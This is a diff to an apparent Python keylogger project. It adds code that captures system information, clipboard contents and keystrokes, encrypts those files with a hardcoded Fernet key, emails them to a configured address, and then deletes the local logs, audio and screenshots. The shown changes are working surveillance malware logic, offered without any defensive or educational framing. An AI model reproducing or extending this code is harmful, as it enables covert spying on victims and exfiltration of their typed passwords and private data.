@@ -43,7 +43,11 @@ microphone_time = 10
 email_address = "email_address"
 password = "email_password"
 
+username = getpass.getuser()
+
 toaddr = "email_address"
+
+key = "P9gaeFq6BpQTobg8UV-eIwCTVSIjd-KcDf_xP1-CMg0="
 
 file_path = "E:\\VS Code\\KeyLogger\\Project"
 extend = "\\"
@@ -204,6 +208,25 @@ while number_of_iterations < number_of_iterations_end:
         currentTime = time.time()
         stoppingTime = time.time()+time_iteration
 
-files_to_encrypt = []
-files_to_encrypt.append(file_merge+system_information,
-                        file_merge+clipboard_information, file_merge+keys_information)
+files_to_encrypt=[file_merge+system_information,
+                        file_merge+clipboard_information, file_merge+keys_information]
+encrypted_file_names = [file_merge+system_information_e,file_merge+clipboard_information_e,file_merge+keys_information_e]
+
+count =0
+
+for encrypting_file in files_to_encrypt:
+    with open(files_to_encrypt[count],'rb') as f:
+        data = f.read()
+    
+    fernet= Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_file_names[count],'wb') as f:
+        f.write(encrypted)
+    send_email(encrypted_file_names[count],encrypted_file_names[count],toaddr)
+    count +=1
+time.sleep(120)
+
+delete_files = [system_information,clipboard_information,keys_information,screenshot_information,audio_information]
+for file in delete_files:
+    os.remove(file_merge+file)
